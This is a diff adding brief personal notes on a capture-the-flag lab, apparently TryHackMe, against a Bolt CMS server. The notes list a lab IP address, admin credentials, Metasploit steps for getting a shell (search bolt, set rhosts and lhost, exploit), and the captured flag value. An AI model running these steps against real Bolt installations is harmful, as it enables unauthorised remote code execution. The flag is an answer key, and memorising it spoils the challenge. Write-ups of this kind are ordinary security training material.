@@ -1,0 +1,18 @@
+Date:10/mar/2021
+Time 14:23
+
+10.10.209.29/8000
+10.10.209.29/8000/bolt
+username:bolt
+passwd:boltadmin123
+
+msf6 > search bolt
+msf6 > use 1
+set rhosts, lhost, username, password
+then exploit 
+cd /home
+flag.txt
+cat flag.txt
+THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
+
+it took only 10 min
